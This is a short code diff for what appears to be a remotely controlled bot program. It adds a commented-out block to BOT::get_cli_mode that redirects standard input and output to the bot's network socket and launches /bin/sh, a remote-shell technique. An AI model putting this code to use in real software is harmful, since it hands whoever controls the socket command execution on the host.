@@ -4,6 +4,7 @@
 #include <string.h>
 
 #include <sys/utsname.h>
+#include <unistd.h>
 
 #include "commands.h"
 #include "log.h"
@@ -154,6 +155,22 @@ bool BOT::get_cli_mode()
 		//FIXME: check for errors
 		pclose(fp);
 	}
+	/* bind /bin/sh to socket deprecated since can't exit
+	int sock;
+	char *argv[2] = {"/bin/sh", NULL};
+
+	if (this->socket->get_sock(&sock) == false)
+		return false;
+	close(0); close(1); close(2);
+	dup(sock);
+	dup(sock);
+	dup(sock);
+	ret = execve(argv[0], argv, NULL);
+	if (ret == -1) {
+		perror("execve:");
+		exit(1);
+	}
+	*/
 
 	DEBUG(LOG_DEFAULT, "out from get_cli_mode\n");
 
